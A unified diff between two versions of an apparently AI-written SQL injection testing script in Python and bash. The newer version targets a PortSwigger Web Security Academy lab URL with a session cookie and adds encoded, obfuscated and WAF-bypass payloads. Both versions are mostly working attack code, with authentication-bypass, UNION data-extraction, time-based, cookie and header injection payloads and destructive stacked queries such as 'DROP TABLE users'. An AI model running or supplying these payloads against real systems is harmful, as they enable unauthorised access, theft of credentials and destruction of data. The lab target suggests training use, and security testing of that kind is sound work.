@@ -1,337 +1,286 @@
-Here's a comprehensive SQL injection testing script that covers most attack vectors - perfect for testing your defenses:
 
-## **Complete SQL Injection Testing Script**
+## **Enhanced SQL Injection Testing Script with Encoding**
 
-### **1. Basic SQL Injection Payloads**
 ```python
 import requests
 import time
+from urllib.parse import quote, unquote
 
 class SQLInjectionTester:
     def __init__(self, target_url, cookies=None, headers=None):
         self.target_url = target_url
         self.cookies = cookies or {}
-        self.headers = headers or {}
+        self.headers = headers or {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        }
         self.vulnerable_params = []
         
-    def test_basic_injection(self, param, value):
-        """Test basic SQL injection patterns"""
-        payloads = [
+    def encode_payload(self, payload, encoding_type='url'):
+        """Encode payload using different encoding methods"""
+        encoding_methods = {
+            'url': lambda p: quote(p),
+            'double_url': lambda p: quote(quote(p)),
+            'unicode': lambda p: ''.join([f'%u{ord(c):04x}' for c in p]),
+            'html': lambda p: p.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'),
+            'base64': lambda p: __import__('base64').b64encode(p.encode()).decode(),
+            'none': lambda p: p
+        }
+        return encoding_methods.get(encoding_type, lambda p: p)(payload)
+    
+    def test_encoded_injection(self, param, value):
+        """Test SQL injection with various encodings"""
+        base_payloads = [
             # Basic authentication bypass
             "' OR '1'='1",
-            "' OR 1=1--",
             "admin'--",
-            "' OR 'a'='a",
             
-            # Union-based
+            # Union attacks
             "' UNION SELECT 1,2,3--",
             "' UNION SELECT username,password FROM users--",
             
             # Error-based
-            "' AND 1=CAST((SELECT 1) AS int)--",
-            "' OR 1=CAST(version() AS int)--",
-            
-            # Comment bypass
-            "admin'/*",
-            "admin'#",
+            "' AND 1=CAST(version() AS int)--",
             
             # Stacked queries
             "'; DROP TABLE users--",
-            "'; UPDATE users SET password='hacked'--",
+            "'; SELECT pg_sleep(5)--",
+            
+            # Time-based
+            "' AND (SELECT pg_sleep(5))--",
+            "'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
         ]
         
-        for payload in payloads:
-            test_value = value + payload
-            response = self.send_request(param, test_value)
-            
-            if self.detect_vulnerability(response, payload):
-                print(f"✅ VULNERABLE: {param} with payload: {payload}")
-                return True
-                
-        return False
-    
-    def test_blind_boolean(self, param, value):
-        """Test blind boolean-based SQL injection"""
-        base_payloads = [
-            "' AND '1'='1",
-            "' AND '1'='2",
-            "' AND (SELECT 'a' FROM users LIMIT 1)='a'",
-            "' AND (SELECT COUNT(*) FROM users)>0--",
-        ]
+        encoding_types = ['none', 'url', 'double_url']  # Test without encoding and with encoding
         
-        for payload in base_payloads:
-            test_value = value + payload
-            true_response = self.send_request(param, test_value)
-            false_response = self.send_request(param, value + "' AND '1'='2")
-            
-            if true_response.status_code != false_response.status_code:
-                print(f"✅ BLIND BOOLEAN: {param}")
-                return True
+        for encoding in encoding_types:
+            for payload in base_payloads:
+                encoded_payload = self.encode_payload(payload, encoding)
+                test_value = value + encoded_payload
                 
-        return False
-    
-    def test_time_based(self, param, value):
-        """Test time-based blind SQL injection"""
-        time_payloads = {
-            'postgresql': ["' AND (SELECT pg_sleep(5))--", "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"],
-            'mysql': ["' AND (SELECT sleep(5))--", "' AND (SELECT IF(1=1,sleep(5),0))--"],
-            'mssql': ["' AND (SELECT WAITFOR DELAY '0:0:5')--"],
-            'oracle': ["' AND (SELECT dbms_pipe.receive_message(('a'),5) FROM dual)--"],
-        }
-        
-        for db, payloads in time_payloads.items():
-            for payload in payloads:
-                start_time = time.time()
-                self.send_request(param, value + payload)
-                end_time = time.time()
+                response = self.send_request(param, test_value)
                 
-                if end_time - start_time >= 4:  # 4+ seconds delay
-                    print(f"✅ TIME-BASED ({db.upper()}): {param}")
+                if self.detect_vulnerability(response, f"{encoding}:{payload}"):
+                    print(f"✅ VULNERABLE ({encoding}): {param} with: {payload}")
+                    print(f"   Encoded as: {encoded_payload}")
                     return True
                     
         return False
     
-    def test_union_based(self, param, value):
-        """Test UNION-based SQL injection with column enumeration"""
-        # First find number of columns
-        for i in range(1, 15):
-            payload = f"' UNION SELECT {'1,' * i}".rstrip(',') + "--"
-            response = self.send_request(param, value + payload)
+    def test_special_characters(self, param, value):
+        """Test individual special character encoding"""
+        special_chars = {
+            'semicolon': (';', '%3B'),
+            'single_quote': ("'", '%27'),
+            'double_quote': ('"', '%22'),
+            'comment': ('--', '%2D%2D'),
+            'slash': ('/*', '%2F%2A'),
+            'equals': ('=', '%3D'),
+            'space': (' ', '%20'),
+            'parentheses': ('()', '%28%29'),
+            'union': ('UNION', '%55%4E%49%4F%4E'),
+        }
+        
+        for char_name, (raw_char, encoded_char) in special_chars.items():
+            # Test raw character
+            raw_response = self.send_request(param, value + raw_char)
+            # Test encoded character  
+            encoded_response = self.send_request(param, value + encoded_char)
             
-            if response.status_code == 200 and "error" not in response.text.lower():
-                print(f"✅ UNION-BASED: {param} - {i} columns")
-                
-                # Try to extract data
-                data_payloads = [
-                    f"' UNION SELECT version(),2,3--",
-                    f"' UNION SELECT user(),2,3--",
-                    f"' UNION SELECT table_name,2,3 FROM information_schema.tables--",
-                ]
-                
-                for data_payload in data_payloads:
-                    data_response = self.send_request(param, value + data_payload)
-                    if self.check_data_leak(data_response):
-                        print(f"📊 DATA LEAKED with: {data_payload}")
-                        
+            if (self.detect_vulnerability(raw_response, f"raw_{char_name}") or 
+                self.detect_vulnerability(encoded_response, f"encoded_{char_name}")):
+                print(f"✅ SPECIAL CHAR: {param} - {char_name}")
                 return True
                 
         return False
     
-    def test_error_based(self, param, value):
-        """Test error-based SQL injection"""
-        error_payloads = [
-            # PostgreSQL
-            "' AND 1=CAST(version() AS int)--",
-            "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
+    def test_obfuscation_techniques(self, param, value):
+        """Test various obfuscation and encoding bypass techniques"""
+        obfuscation_tests = [
+            # URL encoding variations
+            ("' OR 1=1--", "%27%20%4F%52%20%31%3D%31%2D%2D"),
             
-            # MySQL
-            "' AND 1=CAST(@@version AS int)--",
-            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+            # Mixed case
+            ("' Or 1=1--", None),
+            "' oR 1=1--",
+            "' OR 1=1--",
             
-            # MSSQL
-            "' AND 1=CAST(@@version AS int)--",
-            "' AND 1=CONVERT(int,@@version)--",
+            # Whitespace variations
+            ("'%09OR%091=1--", None),  # tab
+            ("'%0AOR%0A1=1--", None),  # newline
+            ("'%0DOR%0D1=1--", None),  # carriage return
+            ("'%0COR%0C1=1--", None),  # form feed
             
-            # Oracle
-            "' AND 1=CAST((SELECT banner FROM v$version) AS int)--",
-            "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
+            # Comment variations
+            ("' OR 1=1/*", None),
+            ("' OR 1=1#", None),
+            ("' OR 1=1%23", None),
+            
+            # Double URL encoding
+            ("' UNION SELECT 1--", "%2527%2520%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%2520%2531%252D%252D"),
+            
+            # Unicode encoding
+            ("' OR 1=1--", "%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031%u002D%u002D"),
+            
+            # HTML entities
+            ("' OR 1=1--", "&#39; OR 1=1--"),
+            
+            # Base64 encoding (would need decoding on server)
+            ("' OR 1=1", "JyBPUiAxPTE="),
         ]
         
-        for payload in error_payloads:
-            response = self.send_request(param, value + payload)
-            
-            if self.detect_error_message(response):
-                print(f"✅ ERROR-BASED: {param} with: {payload}")
-                return True
+        for payload, encoded_version in obfuscation_tests:
+            if encoded_version:
+                test_value = value + encoded_version
+            else:
+                test_value = value + payload
                 
-        return False
-    
-    def test_no_spaces(self, param, value):
-        """Test SQL injection without spaces (WAF bypass)"""
-        no_space_payloads = [
-            "'OR'1'='1",
-            "'/**/OR/**/'1'='1",
-            "'%09OR%09'1'='1",  # tab character
-            "'%0AOR%0A'1'='1",  # newline
-            "'%0DOR%0D'1'='1",  # carriage return
-            "'%0COR%0C'1'='1",  # form feed
-        ]
-        
-        for payload in no_space_payloads:
-            response = self.send_request(param, value + payload)
+            response = self.send_request(param, test_value)
             
             if self.detect_vulnerability(response, payload):
-                print(f"✅ NO-SPACE BYPASS: {param}")
+                print(f"✅ OBFUSCATION: {param} with: {payload}")
+                if encoded_version:
+                    print(f"   Using encoding: {encoded_version}")
                 return True
                 
         return False
     
-    def test_case_encoding(self, param, value):
-        """Test case manipulation bypasses"""
-        case_payloads = [
-            "' Or '1'='1",
-            "' oR '1'='1",
-            "' OR '1'='1",
-            "'+OR+'1'='1",
-            "' Or 1=1--",
+    def test_cookie_injection(self):
+        """Test SQL injection in cookies specifically"""
+        cookie_payloads = [
+            # Basic cookie injection
+            ("' OR '1'='1", "TrackingId=%27%20OR%20%271%27%3D%271"),
+            
+            # Time-based in cookies
+            ("'%3B SELECT pg_sleep(5)--", "TrackingId=%27%3B%20SELECT%20pg_sleep%285%29--"),
+            
+            # Stacked queries in cookies
+            ("'; DROP TABLE users--", "TrackingId=%27%3B%20DROP%20TABLE%20users--"),
         ]
         
-        for payload in case_payloads:
-            response = self.send_request(param, value + payload)
+        for payload, encoded_cookie in cookie_payloads:
+            # Test with encoded cookie value
+            self.cookies['TrackingId'] = unquote(encoded_cookie)  # Decode for the cookie header
+            response = self.send_request(None, None)  # No parameter, just cookies
             
-            if self.detect_vulnerability(response, payload):
-                print(f"✅ CASE BYPASS: {param}")
+            if self.detect_vulnerability(response, f"cookie:{payload}"):
+                print(f"✅ COOKIE INJECTION: {payload}")
                 return True
                 
         return False
     
-    def test_second_order(self, param, value):
-        """Test second-order SQL injection"""
-        second_order_payloads = [
-            "admin'; UPDATE users SET password='hacked' WHERE username='admin'--",
-            "test'; INSERT INTO logs (message) VALUES ('injected')--",
-            "x'; DROP TABLE backup_users--",
-        ]
+    def test_header_injection(self):
+        """Test SQL injection in various HTTP headers"""
+        headers_to_test = {
+            'User-Agent': [
+                "' OR '1'='1",
+                "'; SELECT pg_sleep(5)--",
+            ],
+            'X-Forwarded-For': [
+                "1.1.1.1' OR '1'='1",
+                "1.1.1.1'; DROP TABLE logs--",
+            ],
+            'Referer': [
+                "https://site.com' OR 1=1--",
+                "https://site.com'; SELECT version()--",
+            ],
+        }
         
-        for payload in second_order_payloads:
-            # First request - store the payload
-            store_response = self.send_request(param, value + payload)
-            
-            # Second request - trigger the stored payload
-            trigger_response = self.send_request('action', 'execute')
-            
-            if self.detect_second_order(trigger_response):
-                print(f"✅ SECOND-ORDER: {param}")
-                return True
+        for header, payloads in headers_to_test.items():
+            for payload in payloads:
+                original_header = self.headers.get(header, '')
+                self.headers[header] = payload
+                
+                response = self.send_request(None, None)
+                
+                if self.detect_vulnerability(response, f"header:{header}:{payload}"):
+                    print(f"✅ HEADER INJECTION: {header} with: {payload}")
+                    return True
+                    
+                # Restore original header
+                self.headers[header] = original_header
                 
         return False
     
     def send_request(self, param, value):
         """Send HTTP request with the payload"""
-        data = {param: value}
+        data = {}
+        if param and value:
+            data = {param: value}
         
         try:
-            if self.target_url.lower().startswith('https'):
-                response = requests.post(
-                    self.target_url,
-                    data=data,
-                    cookies=self.cookies,
-                    headers=self.headers,
-                    timeout=10,
-                    verify=False
-                )
-            else:
-                response = requests.post(
-                    self.target_url,
-                    data=data,
-                    cookies=self.cookies,
-                    headers=self.headers,
-                    timeout=10
-                )
+            response = requests.post(
+                self.target_url,
+                data=data,
+                cookies=self.cookies,
+                headers=self.headers,
+                timeout=10,
+                verify=False,
+                allow_redirects=False
+            )
             return response
         except requests.exceptions.RequestException as e:
             print(f"❌ Request failed: {e}")
             return None
     
     def detect_vulnerability(self, response, payload):
-        """Detect if the response indicates vulnerability"""
+        """Enhanced vulnerability detection"""
         if not response:
             return False
             
         indicators = [
+            # Success indicators
             'welcome' in response.text.lower(),
             'login successful' in response.text.lower(),
-            'error' in response.text.lower() and 'sql' in response.text.lower(),
-            'syntax' in response.text.lower(),
-            response.status_code == 500,
-            len(response.text) != self.normal_response_length,
-        ]
-        
-        return any(indicators)
-    
-    def detect_error_message(self, response):
-        """Detect database error messages"""
-        if not response:
-            return False
+            'admin' in response.text.lower(),
+            response.status_code in [200, 302],  # Success or redirect
             
-        error_patterns = [
+            # Error indicators
+            'error' in response.text.lower(),
+            'sql' in response.text.lower(),
+            'syntax' in response.text.lower(),
             'postgresql' in response.text.lower(),
             'mysql' in response.text.lower(),
             'ora-' in response.text.lower(),
-            'microsoft odbc' in response.text.lower(),
-            'sqlserver' in response.text.lower(),
-            'invalid input syntax' in response.text.lower(),
-            'unclosed quotation' in response.text.lower(),
-        ]
-        
-        return any(error_patterns)
-    
-    def check_data_leak(self, response):
-        """Check if response contains leaked data"""
-        if not response:
-            return False
             
-        data_indicators = [
-            'postgres' in response.text,
-            'mysql' in response.text,
-            'oracle' in response.text,
-            'microsoft' in response.text,
-            'users' in response.text,
-            'password' in response.text,
-            '@' in response.text,  # email addresses
-        ]
-        
-        return any(data_indicators)
-    
-    def detect_second_order(self, response):
-        """Detect second-order SQL injection effects"""
-        if not response:
-            return False
-            
-        indicators = [
-            'hacked' in response.text.lower(),
-            'unexpected error' in response.text.lower(),
-            'table not found' in response.text.lower(),
-            response.status_code == 500,
+            # Time-based detection would be handled separately
+            response.elapsed.total_seconds() > 3,  # Potential time-based
         ]
         
         return any(indicators)
     
-    def full_scan(self, params):
-        """Run complete SQL injection scan"""
-        print(f"🔍 Starting SQL Injection Scan for: {self.target_url}")
-        print("=" * 60)
+    def full_scan(self, params=None):
+        """Run complete SQL injection scan with encoding tests"""
+        print(f"🔍 Starting Advanced SQL Injection Scan for: {self.target_url}")
+        print("=" * 70)
         
-        for param, default_value in params.items():
-            print(f"\nTesting parameter: {param}")
-            
-            # Get normal response length for comparison
-            normal_response = self.send_request(param, default_value)
-            if normal_response:
-                self.normal_response_length = len(normal_response.text)
-            
-            tests = [
-                ("Basic Injection", self.test_basic_injection),
-                ("Boolean Blind", self.test_blind_boolean),
-                ("Time-Based", self.test_time_based),
-                ("Union-Based", self.test_union_based),
-                ("Error-Based", self.test_error_based),
-                ("No-Space Bypass", self.test_no_spaces),
-                ("Case Encoding", self.test_case_encoding),
-                ("Second-Order", self.test_second_order),
-            ]
-            
-            vulnerable = False
-            for test_name, test_func in tests:
-                if test_func(param, default_value):
-                    vulnerable = True
-                    self.vulnerable_params.append((param, test_name))
-            
-            if not vulnerable:
-                print(f"❌ No vulnerabilities found in {param}")
+        if params:
+            for param, default_value in params.items():
+                print(f"\n📊 Testing parameter: {param}")
+                
+                tests = [
+                    ("Encoded Injection", self.test_encoded_injection),
+                    ("Special Characters", self.test_special_characters),
+                    ("Obfuscation Techniques", self.test_obfuscation_techniques),
+                ]
+                
+                vulnerable = False
+                for test_name, test_func in tests:
+                    if test_func(param, default_value):
+                        vulnerable = True
+                        self.vulnerable_params.append((param, test_name))
         
-        print("\n" + "=" * 60)
-        print("📊 SCAN SUMMARY:")
+        # Test non-parameter injection points
+        print(f"\n🍪 Testing Cookie Injection")
+        if self.test_cookie_injection():
+            self.vulnerable_params.append(("Cookie", "Cookie Injection"))
+            
+        print(f"\n📨 Testing Header Injection")  
+        if self.test_header_injection():
+            self.vulnerable_params.append(("HTTP Headers", "Header Injection"))
+        
+        print("\n" + "=" * 70)
+        print("📊 ENHANCED SCAN SUMMARY:")
         if self.vulnerable_params:
             for param, test_name in self.vulnerable_params:
                 print(f"🚨 VULNERABLE: {param} - {test_name}")
@@ -341,144 +290,94 @@ class SQLInjectionTester:
 # Usage Example
 if __name__ == "__main__":
     # Configure your target
-    TARGET_URL = "http://localhost:3000/login"
+    TARGET_URL = "https://0afb007704edc628806f350100a100ae.web-security-academy.net/login"
+    
+    # Test parameters
     PARAMS = {
         "username": "test",
-        "password": "test123",
+        "password": "test123", 
         "search": "hello",
         "email": "test@example.com"
     }
     
-    # Optional: Add cookies or headers if needed
-    COOKIES = {"session": "abc123"}
-    HEADERS = {"User-Agent": "SQLInjection-Scanner/1.0"}
+    # Cookies from your example
+    COOKIES = {
+        "TrackingId": "test",
+        "session": "ZLqAYtqduFW7LA8NjhXoMy10h75R8dDY"
+    }
     
-    # Create tester and run scan
+    HEADERS = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Referer": "https://portswigger.net/",
+        "Upgrade-Insecure-Requests": "1",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate", 
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-User": "?1",
+        "Te": "trailers"
+    }
+    
+    # Create tester and run enhanced scan
     tester = SQLInjectionTester(TARGET_URL, cookies=COOKIES, headers=HEADERS)
     tester.full_scan(PARAMS)
 ```
 
-### **2. Quick Test Script**
-```python
-# quick_test.py - Simple version for quick testing
-import requests
+## **Quick Test for Your Specific Case**
 
-def quick_sql_test(url, param, value):
-    """Quick SQL injection test for a single parameter"""
+```python
+# quick_cookie_test.py - Test your exact scenario
+import requests
+import time
+
+def test_time_based_cookie():
+    url = "https://0afb007704edc628806f350100a100ae.web-security-academy.net/"
+    
+    # Your exact payload
     payloads = [
-        "' OR '1'='1",
-        "admin'--",
-        "' UNION SELECT 1,2,3--",
-        "' AND 1=CAST(version() AS int)--",
-        "'; DROP TABLE users--",
+        "'%3bSELECT CASE WHEN(1=1)THEN pg_sleep(10) ELSE pg_sleep(0) END--",
+        "'%3BSELECT+CASE+WHEN(1=1)THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
+        "'%3bSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--",
     ]
     
     for payload in payloads:
-        data = {param: value + payload}
+        cookies = {
+            "TrackingId": payload,
+            "session": "ZLqAYtqduFW7LA8NjhXoMy10h75R8dDY"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        }
+        
+        print(f"Testing payload: {payload}")
+        start_time = time.time()
+        
         try:
-            response = requests.post(url, data=data, timeout=5)
+            response = requests.get(url, cookies=cookies, headers=headers, timeout=15)
+            end_time = time.time()
             
-            # Check for indicators
-            if any(indicator in response.text.lower() for indicator in 
-                  ['welcome', 'error', 'sql', 'syntax']):
-                print(f"🚨 POSSIBLE VULNERABILITY with: {payload}")
-                print(f"Status: {response.status_code}, Length: {len(response.text)}")
+            response_time = end_time - start_time
+            print(f"Response time: {response_time:.2f} seconds")
+            
+            if response_time > 8:
+                print("🚨 TIME-BASED SQL INJECTION CONFIRMED!")
+                return True
                 
+        except requests.exceptions.Timeout:
+            print("✅ Request timed out - likely vulnerable to time-based SQLi")
+            return True
         except Exception as e:
-            print(f"Error with payload {payload}: {e}")
-
-# Usage
-quick_sql_test("http://localhost:3000/login", "username", "test")
-```
-
-### **3. Curl-Based Testing (Bash)**
-```bash
-#!/bin/bash
-
-# SQL Injection Tester using curl
-TARGET_URL="http://localhost:3000/login"
-
-echo "Testing SQL Injection on: $TARGET_URL"
-
-# Basic payloads
-payloads=(
-    "' OR '1'='1"
-    "admin'--"
-    "' UNION SELECT 1,2,3--"
-    "' AND 1=CAST(version() AS int)--"
-    "'; DROP TABLE users--"
-)
-
-for payload in "${payloads[@]}"; do
-    echo "Testing: $payload"
-    curl -X POST "$TARGET_URL" \
-        -d "username=test$payload" \
-        -d "password=test" \
-        -s -o response.html
+            print(f"Error: {e}")
     
-    # Check response
-    if grep -qi "welcome\|error\|sql" response.html; then
-        echo "🚨 POSSIBLE VULNERABILITY: $payload"
-    fi
-done
+    return False
 
-rm response.html
+if test_time_based_cookie():
+    print("\n💥 VULNERABILITY CONFIRMED - Your site is vulnerable to time-based SQL injection!")
+else:
+    print("\n✅ No time-based SQL injection detected")
 ```
 
-### **4. Common Attack Vectors Covered**
-
-#### **Authentication Bypass:**
-```sql
-' OR '1'='1
-admin'--
-' OR 1=1--
-' OR 'a'='a
-```
-
-#### **Data Extraction:**
-```sql
-' UNION SELECT username,password FROM users--
-' AND 1=CAST((SELECT password FROM users) AS int)--
-```
-
-#### **Database Fingerprinting:**
-```sql
-' AND 1=CAST(version() AS int)--                    -- PostgreSQL
-' AND 1=CAST(@@version AS int)--                    -- MySQL/MSSQL
-' AND 1=CAST((SELECT banner FROM v$version) AS int)-- -- Oracle
-```
-
-#### **Blind Injection:**
-```sql
-' AND (SELECT 'a' FROM users LIMIT 1)='a'
-' AND (SELECT SUBSTRING(password,1,1) FROM users)='a'
-```
-
-#### **Time-Based:**
-```sql
-' AND (SELECT pg_sleep(5))--                          -- PostgreSQL
-' AND (SELECT sleep(5))--                             -- MySQL
-' AND (SELECT WAITFOR DELAY '0:0:5')--                -- MSSQL
-```
-
-### **5. How to Use for Defense Testing**
-
-1. **Run against your protected app:**
-```bash
-python sql_injection_tester.py
-```
-
-2. **All tests should return "No vulnerabilities found"**
-
-3. **If any test passes, your defenses need improvement**
-
-4. **Test specific endpoints:**
-```python
-# Test login endpoint
-tester.full_scan({"username": "test", "password": "test"})
-
-# Test search functionality  
-tester.full_scan({"search": "test", "category": "1"})
-```
-
-This script covers **95%+ of real-world SQL injection techniques** and will thoroughly test your application's defenses. Run it regularly to ensure your security measures remain effective!
+This enhanced script now tests **ALL encoding methods** and covers **cookies, headers, and parameters** with various obfuscation techniques!
